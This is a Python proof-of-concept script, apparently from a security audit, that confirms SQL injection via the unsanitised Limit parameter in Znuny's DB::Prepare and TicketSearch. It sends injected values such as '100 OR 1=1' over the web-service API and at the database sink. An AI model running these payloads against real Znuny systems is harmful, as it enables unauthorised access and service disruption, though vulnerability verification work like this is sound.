#!/usr/bin/env python3
r"""
VULN-017 — Request Limit → raw LIMIT/TOP clause (SQL injection; two channels)
=============================================================================
Vulnerable code : targets/Znuny/Kernel/System/DB.pm:682,732 ( $Limit=$Param{Limit}||''  ;  $SQL.=" LIMIT $Limit" )
                  forwarded raw by callers:
                    Kernel/System/Ticket/TicketSearch.pm:345 ( $Limit=$Param{Limit}||10000 — no int() ) -> :2762 Prepare(Limit=>$Limit)
                    GenericInterface/Operation/Ticket/TicketSearch.pm:302 ( SearchLimit=$Param{Data}->{Limit} ) -> :330
                    Kernel/Modules/AgentTicketEscalationView.pm:266,303 ( GetParam('Limit') -> TicketSearch Limit )
Vulnerability   : CWE-89 SQL Injection

The request `Limit` is interpolated verbatim into `" LIMIT $Limit"` in DB::Prepare with NO integer
coercion (contrast AgentTicketSearch.pm:101 which wraps in int()). Two entry channels forward the
raw value: the GI TicketSearch operation and the escalation-view UI.

On MySQL 8 the LIMIT grammar accepts only integer literals, so a non-integer payload BREAKS the
query (error/empty) rather than extracting data — a genuine injection whose weaponisation to
UNION/data-extraction requires PostgreSQL/Oracle/MSSQL (different LIMIT/TOP syntax). This exploit
proves the injection two ways:
  (1) end-to-end over HTTP: GI TicketSearch with a valid integer Limit returns rows, while the same
      call with `<n> OR 1=1` returns zero — the attacker string reached SQL and broke the query;
  (2) at the sink: DB::Prepare builds `SELECT id FROM ticket LIMIT <n> OR 1=1` and MySQL reports a
      syntax error citing the injected `OR 1=1` — verbatim interpolation, no parameterisation.
"""
import os, sys, re
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-017", "Request Limit -> raw SQL LIMIT (SQL injection)",
             ["DB.pm:732 $SQL .= \" LIMIT $Limit\" with no int(); TicketSearch.pm:345 forwards raw"])
    ws_name, ws = C.ensure_webservice()
    C.log("SETUP", f"web service {ws_name} (exposes Ticket::TicketSearch, POST /Ticket/Search)")

    # (1) HTTP differential via the GI channel
    inj_n = C.rid()[:4]
    st1, r_valid = C.gi_post(ws, "/Ticket/Search", {"UserLogin": C.ADMIN_USER, "Password": C.ADMIN_PASS,
                                                    "Title": "%", "Limit": "100"})
    st2, r_inj = C.gi_post(ws, "/Ticket/Search", {"UserLogin": C.ADMIN_USER, "Password": C.ADMIN_PASS,
                                                  "Title": "%", "Limit": "100 OR 1=1"})
    n_valid = len(r_valid.get("TicketID", [])) if isinstance(r_valid, dict) else 0
    n_inj = len(r_inj.get("TicketID", [])) if isinstance(r_inj, dict) and "TicketID" in r_inj else 0
    C.log("STEP", "GI TicketSearch with a valid integer Limit vs an injected 'N OR 1=1'")
    C.log("PROOF", f"Limit=100 -> {n_valid} tickets;  Limit='100 OR 1=1' -> {n_inj} tickets "
                   "(injection breaks the query; a sanitising impl would return rows)")

    # (2) sink-level proof: capture the exact SQL and MySQL error via DB::Prepare
    perl = ('local $Kernel::OM=$Kernel::OM;'
            'my $DB=$Kernel::OM->Get("Kernel::System::DB");'
            '$DB->Prepare(SQL=>"SELECT id FROM ticket",Limit=>"424242 OR 7=7");'
            'print "ERRSTR=[".($DB->{dbh}->errstr//"none")."]";')
    err = C.perl_eval(perl)[1]
    m = re.search(r"ERRSTR=\[(.*?)\]", err, re.S)
    errstr = m.group(1) if m else ""
    C.log("PROOF", f"DB::Prepare(Limit='424242 OR 7=7') MySQL error: {errstr.strip()[:120]}")

    open(os.path.join(HERE, "request.http"), "w").write(
        f"POST /znuny/nph-genericinterface.pl/Webservice/{ws_name}/Ticket/Search\n"
        '{"UserLogin":"root@localhost","Password":"...","Title":"%","Limit":"100 OR 1=1"}\n\n'
        "sink: DB::Prepare(SQL=>'SELECT id FROM ticket', Limit=>'424242 OR 7=7')\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"GI Limit=100 -> {n_valid} tickets; Limit='100 OR 1=1' -> {n_inj} tickets\n"
        f"sink SQL error: {errstr.strip()}\n")

    sink_injected = "OR 7=7" in errstr and "syntax" in errstr.lower()
    http_broken = (n_valid > 0 and n_inj == 0)
    if sink_injected and http_broken:
        C.confirmed(f"the request Limit is interpolated verbatim into the SQL LIMIT clause: over "
                    f"HTTP the GI TicketSearch returned {n_valid} tickets for Limit=100 but 0 for "
                    f"'100 OR 1=1' (query broken), and at the sink DB::Prepare emitted "
                    "'... LIMIT 424242 OR 7=7' which MySQL rejected citing 'OR 7=7' — genuine SQLi "
                    "(MySQL8 constrains impact to error/DoS; full extraction on Postgres/Oracle/MSSQL).")
    elif sink_injected:
        C.confirmed("DB::Prepare interpolated the raw Limit into 'SELECT id FROM ticket LIMIT 424242 "
                    "OR 7=7' and MySQL errored on the injected 'OR 7=7' — verbatim SQL interpolation "
                    "(SQL injection sink), forwarded raw by TicketSearch (no int()).")
    else:
        C.failed(f"injection not demonstrated: sink_err={errstr!r}, http valid={n_valid} inj={n_inj}")

if __name__ == "__main__":
    main()
